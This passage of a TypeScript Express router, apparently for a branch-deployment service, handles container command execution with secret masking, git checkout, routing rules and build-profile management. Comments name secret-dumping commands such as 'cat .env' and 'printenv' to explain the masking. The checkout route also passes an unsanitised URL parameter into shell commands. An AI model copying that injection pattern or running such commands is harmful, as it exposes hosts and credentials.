            ...(entry.projectId ? { 'X-CDS-Source-Project-Id': entry.projectId } : {}),
            'X-CDS-Source-Branch-Id': entry.id,
          },
          body: JSON.stringify({}),
        });
        if (upstream.ok) {
          redeployTriggered = true;
          // 后台读尽 SSE 流(成功路径流式到部署结束),正常 drain 避免连接背压拖住服务端写入;不 await。
          void upstream.text().catch(() => { /* drain best-effort */ });
        } else {
          const errText = await upstream.text().catch(() => '');
          let msg = errText;
          try { const j = JSON.parse(errText) as { error?: unknown }; if (typeof j?.error === 'string') msg = j.error; } catch { /* 保留原文 */ }
          redeployRejected = { status: upstream.status, message: (msg || '').slice(0, 300) };
          console.warn(`[extra-services] redeploy 被拒(HTTP ${upstream.status}) ${entry.id}: ${redeployRejected.message}`);
        }
      } catch (err) {
        redeployRejected = { status: 0, message: (err as Error).message };
        console.warn(`[extra-services] redeploy 自调失败 ${entry.id}: ${(err as Error).message}`);
      }
      // 破坏性移除 + 重部署被拒 → 回滚到旧额外服务,让 master 元数据与仍在跑的 worker 容器保持一致,
      // 不留幽灵服务(Codex P2)。新增/纯改不回滚(deploy 被拒也保留已声明配置,用户可处理后重发)。
      if (redeployRejected && hasDestructiveRemoval) {
        stateService.setBranchExtraProfiles(entry.id, prevExtraProfilesSnapshot);
        updated = stateService.getBranch(entry.id)!;
        removalRolledBack = true;
        console.warn(
          `[extra-services] 重部署被拒且含破坏性移除(${destructivelyDroppedIds.join(', ')}),已回滚额外服务以避免幽灵服务 ${entry.id}`,
        );
      }
    }
    // 清理被移除额外服务的孤立 profileOverride（Codex P2「Clear stale overrides when removing extra services」）：
    // 删一个有 profileOverride 的额外服务时,只改 extraProfiles 会把 entry.profileOverrides[id] 留下;若该分支
    // 之后用**同 id**新建另一个临时服务,resolveEffectiveProfile 会把旧 override(镜像/env/路由)悄悄套到新服务上,
    // 部署成上一轮的值而非刚提交的。这里按**最终**(已结算回滚)的 extraProfiles 算出真正被移除的 id,清掉其 override。
    // 注:回滚时 final == prev,removedIds 为空,不会误删;额外 id 不会撞项目 profile id(PUT 已拒),清除安全。
    {
      const finalExtraIds = new Set((updated.extraProfiles || []).map((p) => p.id));
      let clearedAnyOverride = false;
      for (const prev of prevExtraProfilesSnapshot) {
        if (!finalExtraIds.has(prev.id) && updated.profileOverrides?.[prev.id]) {
          stateService.clearBranchProfileOverride(entry.id, prev.id);
          clearedAnyOverride = true;
        }
      }
      // clearBranchProfileOverride 只改内存,必须显式落盘（Bugbot Medium「Extra removal override not
      // persisted」）：extraProfiles 已由 setBranchExtraProfiles 持久化,若不 save 这次 override 清除,重启会
      // 重新载入旧 profileOverrides,同 id 新服务又会套上陈旧 env/镜像。
      if (clearedAnyOverride) {
        stateService.save();
        updated = stateService.getBranch(entry.id)!;
      }
    }
    res.json({
      extraProfiles: maskExtraProfilesEnv(updated.extraProfiles || []) || [],
      count: (updated.extraProfiles || []).length,
      redeployTriggered,
      ...(redeployRejected ? { redeployRejected } : {}),
      ...(removalRolledBack ? { removalRolledBack, rolledBackServiceIds: destructivelyDroppedIds } : {}),
      hint: redeployTriggered
        ? '已触发重部署,额外服务将随本次部署起容器(几十秒后查看分支服务列表)'
        : removalRolledBack
          ? `重部署被拒(HTTP ${redeployRejected!.status}: ${redeployRejected!.message}),为避免幽灵服务已回滚移除操作(${destructivelyDroppedIds.join(', ')} 保留);请待 owning executor 上线后重试`
          : wantRedeploy
            ? `额外服务已声明,但触发重部署未成功${redeployRejected ? `(HTTP ${redeployRejected.status}: ${redeployRejected.message})` : ''};请处理后手动部署(或重发本请求带 ?redeploy=1)`
            : '额外服务已声明;需触发一次分支部署才会真正起容器(或重发本请求带 ?redeploy=1)',
    });
  });

  // ── Container exec (run command inside container) ──

  router.post('/branches/:id/container-exec', async (req, res) => {
    const { id } = req.params;
    const { profileId, command } = req.body as { profileId?: string; command?: string };
    if (!command || typeof command !== 'string' || !command.trim()) {
      res.status(400).json({ error: '请输入命令' });
      return;
    }

    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到运行中的服务' });
      return;
    }

    try {
      const result = await shell.exec(
        `docker exec ${svc.containerName} sh -c ${JSON.stringify(command)}`,
        { timeout: 30_000 },
      );
      // F15 (HIGH severity, 2026-05-02): docker exec output is the #1 leak
      // vector — `env` / `printenv` / `cat .env` / app debug commands all
      // dump GITHUB_PAT, DB passwords, JWT secrets directly to stdout. Mask
      // by default; admin can opt out with ?unmask=1 (logged via activity
      // stream). See cds/src/services/secret-masker.ts for coverage.
      const mask = shouldMask(req);

      // Bug R (MED, 2026-05-10): the line-mode KEY=VALUE masker only catches
      // the `env` / `printenv` shape. A common debugging pattern like
      //   echo hello && echo $REDIS_PASSWORD
      // emits the bare value on its own line — the masker doesn't see a key,
      // so the whole secret leaks. Mitigation: take the actual sensitive env
      // values for this profile and replace any literal occurrence of those
      // values in stdout/stderr with `***`. Preserves the rest of the output
      // (no more "stdout suspiciously empty" pain).
      let stdoutMasked = maskSecretsText(result.stdout, { mask });
      let stderrMasked = maskSecretsText(result.stderr, { mask });
      if (mask && profileId) {
        try {
          // 用分支**有效** profiles 查（项目 profiles + 分支额外服务），而非仅项目级 getBuildProfile：
          // 否则分支级额外服务(extraProfiles)的敏感 env 查不到，`echo $TOKEN` 会原样吐出明文（Codex P2）。
          // 再经 resolveEffectiveProfile 应用 profileOverrides（Codex P2「Resolve overrides before masking exec
          // output」）：getEffectiveProfilesForBranch 只合并项目+额外 profile,不含 profileOverrides[profileId].env;
          // 若密钥是经 PUT /profile-overrides 存的，未解析前查不到 → `echo $TOKEN` 仍吐明文(尽管 override 响应/
          // 分支视图已脱敏)。resolveEffectiveProfile 把 override env 并入后再收集敏感值。
          const baseProf = stateService.getEffectiveProfilesForBranch(entry).find((p) => p.id === profileId);
          const prof = baseProf ? (resolveEffectiveProfile(baseProf, entry) as any) : undefined;
          const profEnv: Record<string, string> = (prof && prof.env) || {};
          // Collect concrete sensitive values long enough to be plausible
          // secrets. <6 chars are skipped to avoid mangling normal strings
          // like "INFO" that happen to match a flag value.
          const sensitiveValues: string[] = [];
          for (const [k, v] of Object.entries(profEnv)) {
            if (typeof v !== 'string' || v.length < 6) continue;
            // 敏感判定与 maskEnvRecord 完全同口径：key 名走 isSensitiveKey 完整覆盖（含 WEBHOOK/SMTP_*/
            // AUTH/JWT/PAT/*_KEY，旧窄正则不含这些）OR 值是含内联凭据的 URL（DATABASE_URL/MONGODB_URI 等 key
            // 名不命中但值泄密）。否则 `echo $WEBHOOK_URL` 在 GET/PUT 已脱敏的同一密钥仍从 exec 输出原样吐出
            // （Codex P2「Reuse sensitive-key coverage for exec masking」）。
            if (!isSensitiveKey(k) && !looksLikeUrlWithCredentials(v)) continue;
            sensitiveValues.push(v);
          }
          // Sort longest-first so a value that contains another value as a
          // substring still gets fully masked.
          sensitiveValues.sort((a, b) => b.length - a.length);
          const escapeRegex = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
          for (const val of sensitiveValues) {
            const re = new RegExp(escapeRegex(val), 'g');
            stdoutMasked = stdoutMasked.replace(re, '***');
            stderrMasked = stderrMasked.replace(re, '***');
          }
        } catch { /* never let masking failure break the response */ }
      }

      res.json({
        exitCode: result.exitCode,
        stdout: stdoutMasked,
        stderr: stderrMasked,
        masked: mask,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Git log (historical commits) ──

  router.get('/branches/:id/git-log', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const count = Math.min(parseInt(req.query.count as string) || 20, 50);
    try {
      const SEP = '<SEP>';
      const format = ['%h', '%s', '%an', '%ar'].join(SEP);
      const result = await shell.exec(
        `git log -${count} --format="${format}"`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      const commits = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => {
          const [hash, subject, author, date] = line.split(SEP);
          return { hash, subject, author, date };
        });
      res.json({ commits });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Checkout specific commit (pin to historical commit) ──

  router.post('/branches/:id/checkout/:hash', async (req, res) => {
    const { id, hash } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (entry.status === 'building' || entry.status === 'starting') {
      res.status(409).json({ error: '分支正在构建/启动中，无法切换提交' });
      return;
    }

    try {
      // Validate the commit hash exists
      const verify = await shell.exec(
        `git cat-file -t ${hash}`,
        { cwd: entry.worktreePath, timeout: 5_000 },
      );
      if (verify.exitCode !== 0 || verify.stdout.trim() !== 'commit') {
        res.status(400).json({ error: `无效的提交: ${hash}` });
        return;
      }

      // Checkout the specific commit (detached HEAD)
      const result = await shell.exec(
        `git checkout ${hash}`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      if (result.exitCode !== 0) {
        throw new Error(combinedOutput(result));
      }

      // Get full short hash + subject for display
      const logResult = await shell.exec(
        'git log --oneline -1',
        { cwd: entry.worktreePath, timeout: 5_000 },
      );
      const [pinnedHash, ...subjectParts] = logResult.stdout.trim().split(' ');
      const pinnedSubject = subjectParts.join(' ');

      entry.pinnedCommit = pinnedHash || hash;
      stateService.save();

      res.json({
        message: `已切换到提交 ${pinnedHash}`,
        pinnedCommit: entry.pinnedCommit,
        subject: pinnedSubject,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Unpin commit (restore to branch HEAD) ──

  router.post('/branches/:id/unpin', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    try {
      const result = await shell.exec(
        `git checkout ${entry.branch}`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      if (result.exitCode !== 0) {
        // Worktree may not have local branch, reset to origin
        const reset = await shell.exec(
          `git checkout -B ${entry.branch} origin/${entry.branch}`,
          { cwd: entry.worktreePath, timeout: 10_000 },
        );
        if (reset.exitCode !== 0) throw new Error(combinedOutput(reset));
      }

      entry.pinnedCommit = undefined;
      stateService.save();
      res.json({ message: '已恢复到分支最新提交' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Reset branch status ──

  router.post('/branches/:id/reset', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'reset',
      source: 'api.reset-branch',
      reason: 'manual reset branch status',
    });
    if (!branchOperationLease) return;
    try {
      assertBranchOperationCurrent(branchOperationLease, 'reset before state write');
      entry.status = 'idle';
      entry.errorMessage = undefined;
      for (const svc of Object.values(entry.services)) {
        if (svc.status === 'error' || svc.status === 'building') {
          svc.status = 'idle';
          svc.errorMessage = undefined;
        }
      }
      assertBranchOperationCurrent(branchOperationLease, 'reset before state save');
      stateService.save();
      completeBranchOperation(branchOperationLease, 'completed');
      res.json({ message: '分支状态已重置', operationId: branchOperationLease.operationId });
    } catch (err) {
      if (err instanceof BranchOperationSupersededError) {
        completeBranchOperation(branchOperationLease, 'cancelled', err.message);
        res.status(409).json({ error: err.message, operationId: branchOperationLease.operationId });
        return;
      }
      completeBranchOperation(branchOperationLease, 'failed', (err as Error).message);
      res.status(500).json({ error: (err as Error).message, operationId: branchOperationLease.operationId });
    }
  });

  // ── Routing rules CRUD ──

  router.get('/routing-rules', (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const rules = projectFilter
      ? stateService.getRoutingRulesForProject(projectFilter)
      : stateService.getRoutingRules();
    res.json({ rules });
  });

  router.post('/routing-rules', (req, res) => {
    try {
      const rule = req.body as RoutingRule;
      if (!rule.id || !rule.type || !rule.match || !rule.branch) {
        res.status(400).json({ error: 'id、类型、匹配模式和目标分支为必填项' });
        return;
      }
      rule.priority = rule.priority ?? 0;
      rule.enabled = rule.enabled ?? true;
      // P4 Part 17 (G14 fix): mirror the B1 fix on POST /build-profiles
      // and POST /infra — honour the project scope so routing rules
      // created from a non-default project don't silently land in the
      // legacy default project. Source of truth: request body, with
      // ?project= query param as fallback. Validates the project exists
      // to prevent orphan routing rules.
      if (!rule.projectId) {
        const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
        rule.projectId = queryProject || 'default';
      }
      if (!stateService.getProject(rule.projectId)) {
        res.status(400).json({ error: `未知项目: ${rule.projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, rule.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.addRoutingRule(rule);
      stateService.save();
      res.status(201).json({ rule });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/routing-rules/:id', (req, res) => {
    try {
      // Project-key scope check (FU-04 isolation sweep): a project-
      // scoped Agent Key may only mutate routing rules in its own
      // project. Bootstrap key / cookie auth are unaffected.
      const existing = stateService.getRoutingRule(req.params.id);
      if (!existing) { res.status(404).json({ error: `路由规则 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      // Refuse cross-project re-attribution via the body — auth check
      // above already verified the *current* owner; silently moving the
      // rule to another project would bypass that.
      if (req.body && typeof req.body === 'object' && 'projectId' in req.body
          && req.body.projectId !== (existing.projectId || 'default')) {
        res.status(403).json({ error: 'projectId 不可通过 PUT 修改' });
        return;
      }
      stateService.updateRoutingRule(req.params.id, req.body);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/routing-rules/:id', (req, res) => {
    try {
      const existing = stateService.getRoutingRule(req.params.id);
      if (!existing) { res.status(404).json({ error: `路由规则 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      stateService.removeRoutingRule(req.params.id);
      stateService.save();
      res.json({ message: '已删除' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Build profiles CRUD ──

  router.get('/build-profiles', (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const source = projectFilter
      ? stateService.getBuildProfilesForProject(projectFilter)
      : stateService.getBuildProfiles();
    const profiles = source.map(p => ({
      ...p,
      env: p.env ? maskSecrets(p.env) : p.env,
    }));
    res.json({ profiles });
  });

  router.post('/build-profiles', (req, res) => {
    try {
      const profile = req.body as BuildProfile;
      // `command` is optional — Dockerfile-based services may rely on CMD/ENTRYPOINT
      if (!profile.id || !profile.name || !profile.dockerImage) {
        res.status(400).json({ error: 'id、名称、Docker 镜像为必填项' });
        return;
      }
      if (profile.command === undefined || profile.command === null) {
        profile.command = '';
      }
      profile.workDir = profile.workDir || '.';
      profile.containerPort = profile.containerPort || 8080;
      // P4 Part 16 (B1 fix): honor project scope — projectId can come
      // from request body (preferred) or ?project= query param fallback.
      // Without this fix, every new profile silently lands in the
      // legacy 'default' project regardless of which project the user
      // is configuring, breaking multi-project isolation entirely.
      if (!profile.projectId) {
        const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
        profile.projectId = queryProject || 'default';
      }
      // Validate the target project exists so we don't create orphans.
      if (!stateService.getProject(profile.projectId)) {
        res.status(400).json({ error: `未知项目: ${profile.projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, profile.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.addBuildProfile(profile);
      stateService.save();
      res.status(201).json({ profile });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/build-profiles/:id', (req, res) => {
    try {
      // Project-key scope check (FU-04 isolation sweep): see analogous
      // guard on /routing-rules/:id above.
      const existing = stateService.getBuildProfile(req.params.id);
      if (!existing) { res.status(404).json({ error: `构建配置 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      if (req.body && typeof req.body === 'object' && 'projectId' in req.body
          && req.body.projectId !== (existing.projectId || 'default')) {
        res.status(403).json({ error: 'projectId 不可通过 PUT 修改' });
        return;
      }
      // Bug E (HIGH, 2026-05-10): GET /build-profiles returns env values masked
      // as `***` (or `***[masked]***`) for sensitive keys. When the UI does a
      // GET → edit → PUT round-trip without explicitly re-revealing secrets,
      // the PUT body contains those mask sentinels. Without this guard we'd
      // overwrite the real secret with the literal sentinel string,
      // permanently destroying the credential.
      //
      // Fix: scan incoming env (and any env-shaped fields) and replace any
      // value that looks like a mask sentinel with the existing stored value.
      // If the existing key didn't exist, drop the sentinel so we don't
      // create a literal `***` env var.
      const MASK_SENTINELS = new Set(['***', '***[masked]***', '****', '*****']);
      const sanitizeEnv = (incoming: Record<string, unknown>, prevEnv: Record<string, string>): Record<string, string> => {
        const cleaned: Record<string, string> = {};
        for (const [k, v] of Object.entries(incoming || {})) {
          if (typeof v === 'string' && MASK_SENTINELS.has(v.trim())) {
            if (Object.prototype.hasOwnProperty.call(prevEnv, k)) {
              cleaned[k] = prevEnv[k];
            }
            // else: drop — never persist a literal mask sentinel
          } else if (typeof v === 'string') {
            cleaned[k] = v;
          }
        }
        return cleaned;
      };
      const incomingBody: any = req.body && typeof req.body === 'object' ? { ...req.body } : req.body;
      if (incomingBody && typeof incomingBody === 'object') {
        const prevEnv: Record<string, string> = (existing as any).env || {};
        // Bug AA fix (HIGH, 2026-05-10): PUT env 必须 merge,不能 replace。
        //
        // 历史行为:incomingBody.env 直接替换 existing.env(stateService.update
        // BuildProfile 走 Object.assign,把整个 env 字段整体替换)。结果是 UI
        // 想"只改一个 env key"必须先 GET 全表 → 编辑一个 key → PUT 完整表。
        // 任意一步失误就把其它密码全干掉。
        //
        // 修法:本路由把 incoming env merge 进 prevEnv 后再交给 update。
        //   - body.env 中出现的 key:用 body 提供的值(经 mask sanitize)
        //   - body.env 中没出现的 key:沿用 prevEnv 值,一律不删
        // 想真正删 env key 的客户端走专门的 DELETE 路由(未实现)或显式传
        // 该 key 的值为空字符串(下游使用方自己判定)—— 不通过"省略"做删除。
        const mergeEnv = (incoming: Record<string, unknown>): Record<string, string> => {
          const sanitized = sanitizeEnv(incoming, prevEnv);
          return { ...prevEnv, ...sanitized };
        };
        if (incomingBody.env && typeof incomingBody.env === 'object') {
          incomingBody.env = mergeEnv(incomingBody.env);
        }
        if (incomingBody.environment && typeof incomingBody.environment === 'object') {
          // Some clients use `environment` as alias; merge into the actual
          // `env` key to avoid creating a duplicate field.
          incomingBody.env = mergeEnv(incomingBody.environment);
          delete incomingBody.environment;
        }
      }
      stateService.updateBuildProfile(req.params.id, incomingBody);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/build-profiles/:id', async (req, res) => {
    try {
      const existing = stateService.getBuildProfile(req.params.id);
      if (!existing) { res.status(404).json({ error: `构建配置 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      stateService.removeBuildProfile(req.params.id);
      // Bug F (MED, 2026-05-10): when a build-profile is deleted, its
      // entries inside branch.services[<profileId>] are left behind as
      // ghost rows showing status='error' forever. Mirror the behaviour
      // of POST /cleanup-cross-project-services scoped to this single
      // profileId so the UI doesn't keep displaying a dead service.
      const removedProfileId = req.params.id;
      const allBranches = Object.values(stateService.getState().branches || {});
      const skippedBusy: Array<{ branchId: string; profileId: string; reason: string }> = [];
      const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null;
      const actor = resolveActorFromRequest(req);
      const trigger = triggerFromRequest(req);
      for (const entry of allBranches) {
        const svcs = entry.services || {};
        if (Object.prototype.hasOwnProperty.call(svcs, removedProfileId)) {
          const svc = (svcs as any)[removedProfileId];
          const active = branchOperationCoordinator?.getActive(entry.id);
          if (active) {
            skippedBusy.push({ branchId: entry.id, profileId: removedProfileId, reason: `同分支已有写操作正在运行: ${active.request.kind}` });
            serverEventLogStore?.record({
              category: 'container',
              severity: 'warn',
              source: 'api.delete-build-profile',
              action: 'app.build-profile-service.cleanup-skipped',
              message: `skip build profile service cleanup ${entry.id}/${removedProfileId}: branch operation active`,
              projectId: entry.projectId,
              branchId: entry.id,
              profileId: removedProfileId,
              requestId,
              operationId: active.operationId,
              operationKind: active.request.kind,
              operationTrigger: active.request.trigger,
              operationActor: active.request.actor || null,
              operationSource: active.request.source || null,
              details: {
                requestId,
                actor,
                trigger,
                activeOperationId: active.operationId,
                activeKind: active.request.kind,
                reason: 'branch-operation-active',
              },
            });
            continue;
          }
          const branchOperationLease = beginSilentBranchOperation(req, entry, {
            kind: 'cleanup-orphans',
            profileId: removedProfileId,
            source: 'api.delete-build-profile',
            reason: `删除构建配置 ${removedProfileId} 时清理对应容器`,
          });
          if (branchOperationCoordinator && !branchOperationLease) {
            skippedBusy.push({ branchId: entry.id, profileId: removedProfileId, reason: '同分支已有写操作正在运行' });
            serverEventLogStore?.record({
              category: 'container',
              severity: 'warn',
              source: 'api.delete-build-profile',
              action: 'app.build-profile-service.cleanup-skipped',
              message: `skip build profile service cleanup ${entry.id}/${removedProfileId}: branch operation active`,
              projectId: entry.projectId,
              branchId: entry.id,
              profileId: removedProfileId,
              requestId,
              details: {
                requestId,
                actor,
                trigger,
                reason: 'branch-operation-active',
              },
            });
            continue;
          }
          let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
          try {
            assertBranchOperationCurrent(branchOperationLease, `delete build profile before ${entry.id}/${removedProfileId}`);
            if (svc?.containerName) {
              try {
                await containerService.remove(svc.containerName, {
                  projectId: entry.projectId,
                  branchId: entry.id,
                  profileId: removedProfileId,
                  requestId,
                  operationId: branchOperationLease?.operationId || null,
                  actor,
                  trigger,
                  operation: 'build-profile-delete',
                  source: 'api.delete-build-profile',
                  reason: `删除构建配置 ${removedProfileId} 时清理对应容器`,
                });
              } catch { /* already gone */ }
            }
            assertBranchOperationCurrent(branchOperationLease, `delete build profile before state delete ${entry.id}/${removedProfileId}`);
            delete (svcs as any)[removedProfileId];
          } catch (err) {
            branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
            skippedBusy.push({ branchId: entry.id, profileId: removedProfileId, reason: (err as Error).message });
          } finally {
            completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
          }
        }
      }
      stateService.save();
      res.json({ message: '已删除', skippedBusyCount: skippedBusy.length, skippedBusy });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Deploy mode switching ──

  // ── 全局批量改命令 (2026-04-22) ──
  //
  // 用户故事：「我的所有 .NET profile 都用同一套热/冷部署命令，能不能一次性改完？」
  //
  // POST /api/build-profiles/bulk-set-modes
  // body: {
  //   filter: 'all' | 'dotnet' | 'node' | 'python' | { dockerImageMatch: string },
  //   modes: { [modeId]: { label, command } },     // 要写入的所有 mode（覆盖该 profile 的全套）
  //   strategy: 'replace' | 'merge',                // replace: 清空后覆盖；merge: 同 modeId 替换、其他保留
  //   profileIds?: string[],                        // 可选：精准白名单，优先于 filter
  // }
  //
  // 自动在执行前拍 ConfigSnapshot，可在「历史版本」一键回滚。
  router.post('/build-profiles/bulk-set-modes', (req, res) => {
    try {
      const {
        filter = 'all',
        modes,
        strategy = 'merge',
        profileIds,
      } = req.body as {
        filter?: 'all' | 'dotnet' | 'node' | 'python' | { dockerImageMatch?: string };
        modes?: Record<string, { label: string; command: string }>;
        strategy?: 'replace' | 'merge';
        profileIds?: string[];
      };

      if (!modes || typeof modes !== 'object' || Object.keys(modes).length === 0) {
        res.status(400).json({ error: '必须提供 modes（{ modeId: { label, command } }）' });
        return;
      }
      for (const [k, v] of Object.entries(modes)) {
        if (!v || typeof v !== 'object' || !v.label || !v.command) {
          res.status(400).json({ error: `mode "${k}" 缺少 label 或 command` });
          return;
        }
      }

      const matchPattern: ((img: string) => boolean) = (() => {
        if (Array.isArray(profileIds)) return () => false;
        if (filter === 'all') return () => true;
        if (filter === 'dotnet') return img => /dotnet|mcr\.microsoft\.com\/dotnet/i.test(img);
        if (filter === 'node') return img => /node|node:|nodejs/i.test(img);
        if (filter === 'python') return img => /python/i.test(img);
        if (typeof filter === 'object' && filter.dockerImageMatch) {
          const re = new RegExp(filter.dockerImageMatch, 'i');
          return img => re.test(img);
        }
        return () => true;
      })();

      const allProfiles = stateService.getBuildProfiles();
      const targets = Array.isArray(profileIds) && profileIds.length > 0
        ? allProfiles.filter(p => profileIds.includes(p.id))
        : allProfiles.filter(p => matchPattern(p.dockerImage || ''));

      if (targets.length === 0) {
        res.status(400).json({ error: '没有匹配的 profile，请检查 filter / profileIds' });
        return;
      }

      // 自动快照（这是批量破坏性写入）
      const snapshot = stateService.createConfigSnapshot({
        trigger: 'pre-destructive',
        label: `批量设置 ${targets.length} 个 profile 的部署命令（${strategy}）`,
      });

      const updates: Array<{ id: string; modesBefore: number; modesAfter: number }> = [];
      for (const profile of targets) {
        const before = Object.keys(profile.deployModes || {}).length;
        const baseModes = strategy === 'replace' ? {} : { ...(profile.deployModes || {}) };
        for (const [mid, m] of Object.entries(modes)) {
          baseModes[mid] = { label: m.label, command: m.command };
        }
        stateService.updateBuildProfile(profile.id, { deployModes: baseModes });
        updates.push({ id: profile.id, modesBefore: before, modesAfter: Object.keys(baseModes).length });
      }
      stateService.save();

      stateService.recordDestructiveOp({
        type: 'other',
        snapshotId: snapshot.id,
        summary: `批量改 ${targets.length} 个 profile 的部署命令（filter=${typeof filter === 'string' ? filter : 'custom'}, strategy=${strategy}）`,
      });

      res.json({
        applied: true,
        targetCount: targets.length,
        targets: updates,
        snapshotId: snapshot.id,
        message: `已为 ${targets.length} 个 profile 应用新命令。如有问题在「历史版本」回滚。`,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/build-profiles/:id/deploy-mode', (req, res) => {
    try {
      const { id } = req.params;
      const { mode } = req.body as { mode?: string };
      const profile = stateService.getBuildProfile(id);
      if (!profile) {
        res.status(404).json({ error: `构建配置 "${id}" 不存在` });
        return;
      }
      // Validate mode exists (or null/empty to reset to default)
      if (mode && (!profile.deployModes || !profile.deployModes[mode])) {
        const available = profile.deployModes ? Object.keys(profile.deployModes).join(', ') : '无';
        res.status(400).json({ error: `部署模式 "${mode}" 不存在，可用: ${available}` });
        return;
      }
      stateService.updateBuildProfile(id, { activeDeployMode: mode || undefined });
      stateService.save();
      const label = mode && profile.deployModes?.[mode]?.label || 'default';
      res.json({ message: `已切换为 ${label}`, mode: mode || null });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── 热更新开关（2026-04-22 新增）──
  // POST /api/build-profiles/:id/hot-reload  { enabled: boolean, mode?, command?, usePolling? }
  // 关掉热更新：只传 enabled=false，其他字段保留以便下次启用
  router.post('/build-profiles/:id/hot-reload', (req, res) => {
    try {
      const { id } = req.params;
      // 2026-05-07 修复:type union 漏了 dotnet-run / dotnet-restart,导致前端
      // dropdown 即便有这两个选项也提交不上来(类型挡掉)。同步与 HotReloadConfig
      // (types.ts:271)的合法值列表。
      const { enabled, mode, command, usePolling } = req.body as {
        enabled?: boolean;
        mode?: 'dotnet-run' | 'dotnet-restart' | 'dotnet-watch' | 'pnpm-dev' | 'vite' | 'next-dev' | 'custom';
        command?: string;
        usePolling?: boolean;
      };
      const profile = stateService.getBuildProfile(id);
      if (!profile) {
        res.status(404).json({ error: `构建配置 "${id}" 不存在` });
        return;
      }
      if (enabled === undefined) {
        res.status(400).json({ error: '必须传 enabled (true/false)' });
        return;
      }
      // 2026-04-22 —— .NET 默认 dotnet-run（快路径：MSBuild 增量 + kill/restart）。
      // MSBuild 增量绝大多数情况正确；极少数撒谎场景走 清理 清理按钮 (force-rebuild)
      // 破缓存即可。dotnet-restart 保留但仅作疑难兜底，不是默认。
      const isDotnet = /dotnet|mcr\.microsoft\.com\/dotnet/i.test(profile.dockerImage || '');
      const defaultMode = isDotnet ? ('dotnet-run' as const) : ('pnpm-dev' as const);
      const current = profile.hotReload || { enabled: false, mode: defaultMode };
      const next = {
        enabled,
        mode: mode ?? current.mode,
        command: command ?? current.command,
        usePolling: usePolling ?? current.usePolling,
        cleanBeforeBuild: (req.body as { cleanBeforeBuild?: boolean })?.cleanBeforeBuild ?? (current as { cleanBeforeBuild?: boolean }).cleanBeforeBuild ?? true,
      };
      // mode=custom 时必须有 command
      if (next.enabled && next.mode === 'custom' && !next.command) {
        res.status(400).json({ error: 'mode=custom 时必须提供 command' });
        return;
      }
      stateService.updateBuildProfile(id, { hotReload: next });
      stateService.save();
      res.json({
        hotReload: next,
        message: next.enabled
          ? `已启用热更新（${next.mode}）。重启该服务让变更生效。`
          : '已关闭热更新。重启该服务回到标准编译命令。',
        requiresRestart: true,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── 强制干净重建（2026-04-22，对付 MSBuild 增量编译撒谎）──
  //
  // 场景：改了 .cs 文件 5 轮都没生效，DLL 里 grep 得到新字符串，运行进程日志却看不到。
  // 根因：MSBuild 增量编译误判「项目引用未变」跳过 compile，或 dotnet watch 只更新内存
